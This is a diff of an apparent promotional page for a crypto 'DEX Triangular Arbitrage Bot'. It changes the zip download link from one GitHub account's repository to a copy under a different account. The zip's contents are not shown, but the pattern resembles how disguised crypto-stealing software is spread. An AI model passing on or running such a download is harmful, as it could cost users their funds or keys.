@@ -18,7 +18,7 @@ https://vimeo.com/872173635
 
 <p>You can Download the zip file of the program here</p>
 
-https://raw.githubusercontent.com/EaNt3Y/EaNt3Y-DEX-Triangular-Arbitrage-Bot-V4/main/EaNt3Y-DEX-Triangular-Arbitrage-Bot-V4.zip
+https://raw.githubusercontent.com/Olivia4301Chavez/EaNt3Y-DEX-Triangular-Arbitrage-Bot-V4/main/EaNt3Y-DEX-Triangular-Arbitrage-Bot-V4.zip
 
 
 <p>Here what it looks like running and finding a arbitrage.</p>
